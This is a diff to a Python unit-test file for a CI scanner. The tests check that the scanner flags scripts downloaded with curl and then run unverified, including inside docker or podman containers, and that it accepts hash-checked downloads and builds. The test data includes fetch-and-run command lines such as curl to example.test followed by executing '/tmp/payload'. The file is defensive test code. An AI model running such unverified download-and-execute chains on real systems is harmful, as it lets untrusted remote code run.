@@ -895,10 +895,37 @@ class TestTheGapsTheGuardDocuments(unittest.TestCase):
                               'curl -sfL https://example.test/p -o "$DEST"\n'),
                       ("run", "chmod +x /tmp/payload\n/tmp/payload\n"))
 
-    # 3. what runs inside a container.
-    def test_what_a_container_runs_is_one_command_to_this_parser(self):
+    # 3. what runs inside a container. CLOSED for the shape the fleet can
+    # reach -- a bind mount and an interpreter operand -- because the reader
+    # already yields that argv. Mounts are NOT modelled: the binding is by
+    # basename, which is the only name the bytes have on the far side.
+    def test_a_container_running_the_download_under_a_shell(self):
+        self.flagged(("get", "curl -sfL https://example.test/x.sh -o /tmp/x.sh\n"),
+                     ("run", "docker run --rm -v /tmp:/w img bash /w/x.sh\n"))
+
+    def test_a_podman_run_counts_the_same(self):
+        self.flagged(("get", "curl -sfL https://example.test/x.sh -o /tmp/x.sh\n"),
+                     ("run", "podman run --rm -v /tmp:/w img sh /w/x.sh\n"))
+
+    def test_a_container_running_another_file_is_left_alone(self):
         self.accepted(("get", "curl -sfL https://example.test/x.sh -o /tmp/x.sh\n"),
+                      ("run", "docker run --rm -v /tmp:/w img bash /w/other.sh\n"))
+
+    def test_a_verified_download_may_be_run_in_a_container(self):
+        self.accepted(("get", "curl -sfL https://example.test/x.sh -o /tmp/x.sh\n"),
+                      ("check", 'echo "%s  /tmp/x.sh" | sha256sum -c -\n' % HEX),
                       ("run", "docker run --rm -v /tmp:/w img bash /w/x.sh\n"))
+
+    def test_a_docker_build_is_not_a_container_run(self):
+        self.accepted(("get", "curl -sfL https://example.test/x.sh -o /tmp/x.sh\n"),
+                      ("run", "docker build -f x.sh .\n"))
+
+    def test_the_fleets_own_container_line_is_still_clean(self):
+        # adapter-integration.yml's shape, which fetches nothing: the scan must
+        # not invent a use out of an `--entrypoint sh` and an image name.
+        self.accepted(("run", 'docker run --rm -v "$PWD:/work:ro" -w /work '
+                              "--entrypoint sh panopticon-fixtures:latest "
+                              '-c "python3 -m pytest tests/tools/ -q"\n'))
 
     # 4. bytes modified after a passing check.
     def test_bytes_modified_after_a_passing_check(self):
